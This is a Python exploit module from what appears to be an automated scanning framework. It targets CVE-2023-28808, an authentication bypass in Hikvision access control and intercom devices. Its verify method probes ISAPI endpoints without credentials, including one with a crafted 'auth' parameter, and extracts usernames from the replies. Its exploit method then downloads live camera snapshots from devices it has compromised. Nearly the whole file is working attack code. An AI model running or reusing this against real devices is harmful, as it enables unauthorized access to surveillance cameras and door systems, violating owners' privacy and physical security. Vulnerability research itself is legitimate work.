import requests

from loguru import logger

from .base import POCTemplate


class CVE_2023_28808(POCTemplate):
    """Hikvision Access Control/Intercom Authentication Bypass

    Certain Hikvision access control and video intercom products
    contain an authentication bypass vulnerability that allows
    attackers to access device resources without proper credentials.
    CVSS 9.1 Critical.
    """

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['hikvision']
        self.product_version = ''
        self.ref = """
        https://nvd.nist.gov/vuln/detail/CVE-2023-28808
        https://www.hikvision.com/en/support/cybersecurity/security-advisory/
        """
        self.level = POCTemplate.level.high
        self.desc = """Hikvision access control authentication bypass via crafted URL.
        CVSS 9.1. Allows unauthenticated access to device configuration."""

    def verify(self, ip, port=80):
        """Test for auth bypass on Hikvision access control devices"""
        headers = self._get_headers()
        proxies = self._get_proxies()

        # Test unauthenticated access to normally-protected endpoints
        test_urls = [
            # ISAPI user list (should require auth)
            self._get_url(ip, port, '/ISAPI/Security/users'),
            # Device info (may leak info without auth)
            self._get_url(ip, port, '/ISAPI/System/deviceInfo'),
            # Try path traversal variant
            self._get_url(ip, port, '/ISAPI/System/deviceInfo?auth=YWRtaW46MTEK'),
        ]

        for url in test_urls:
            try:
                r = requests.get(
                    url,
                    headers=headers,
                    verify=False,
                    timeout=self.config.timeout,
                    allow_redirects=False,
                    proxies=proxies
                )
                if r.status_code == 200:
                    # Check if we got actual device data back
                    if 'userName' in r.text or 'DeviceInfo' in r.text:
                        user = 'N/A'
                        password = 'N/A'
                        # Try to extract username from user list response
                        if 'userName' in r.text:
                            import re
                            match = re.search(r'<userName>(.*?)</userName>', r.text)
                            if match:
                                user = match.group(1)
                        return ip, str(port), self.product, str(user), str(password), self.name
            except Exception as e:
                logger.error(e)

        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        from requests.auth import HTTPDigestAuth
        img_file_name = f"{ip}-{port}-{user}-{password}-authbypass.jpg"
        # Try to grab snapshot without auth (since auth is bypassed)
        url = self._get_url(ip, port, '/Streaming/channels/101/picture')
        if self._snapshot(url, img_file_name):
            return 1
        # Try with extracted creds if available
        if user != 'N/A' and password != 'N/A':
            return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))
        return 0


POCTemplate.register_poc(CVE_2023_28808)
